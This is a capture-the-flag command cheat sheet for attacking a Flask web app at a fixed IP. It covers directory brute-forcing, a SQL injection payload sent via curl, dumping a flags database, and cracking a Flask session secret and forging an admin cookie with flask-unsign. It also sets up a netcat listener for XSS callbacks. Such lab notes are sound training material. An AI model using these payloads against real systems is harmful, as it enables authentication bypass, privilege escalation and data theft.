# Commands Used in This CTF

## Directory Enumeration
```bash
# Basic gobuster scan (didn't work due to 500 errors)
gobuster dir -u http://152.42.242.139:5000/ -w /usr/share/wordlists/dirb/common.txt

# Working scan (ignore 500 responses)
gobuster dir -u http://152.42.242.139:5000/ -w /usr/share/wordlists/dirb/common.txt -b 500 -t 50

# Alternative with status codes
gobuster dir -u http://152.42.242.139:5000/ -w /usr/share/wordlists/dirb/common.txt -s 200,301,302
```

## cURL Commands
```bash
# Login and save cookies
curl -v -c cookies.txt -X POST http://152.42.242.139:5000/login \
  -d "username=bob&password=bob123"

# Access protected pages with cookie
curl -b cookies.txt http://152.42.242.139:5000/notes

# SQL injection via cURL
curl -b cookies.txt "http://152.42.242.139:5000/search?q=%27%20OR%201%3D1%20--"

# Check headers
curl -I http://152.42.242.139:5000
```

## SQLite Database Analysis
```bash
# Connect to database
sqlite3 app.db

# Show all tables
.tables

# Show schema
.schema

# Query flags table
SELECT * FROM flags;

# Export all flags
sqlite3 app.db "SELECT flag FROM flags;" > flags.txt

# Formatted output
sqlite3 app.db -header -column "SELECT id, name, flag FROM flags;"
```

## Flask Cookie Analysis
```bash
# Install flask-unsign
pipx install flask-unsign

# Decode cookie
flask-unsign --decode --cookie 'session-cookie-here'

# Attempt to crack secret key
flask-unsign --unsign --cookie 'session-cookie-here' \
  --wordlist /usr/share/wordlists/rockyou.txt

# Sign new cookie
flask-unsign --sign --cookie "{'role':'ADMIN','user_id':3}" \
  --secret 'secret-key-here'
```

## Python Virtual Environment (for Kali)
```bash
# Create virtual environment
python3 -m venv flask-env

# Activate it
source flask-env/bin/activate

# Install packages
pip install flask-unsign requests

# Deactivate when done
deactivate
```

## Netcat Listener (for XSS)
```bash
# Start listener
nc -lvnp 8000

# Or use Python HTTP server
python3 -m http.server 8000
```

## Wordlist Locations
```bash
# Common wordlists in Kali
/usr/share/wordlists/dirb/common.txt
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
/usr/share/wordlists/rockyou.txt
```
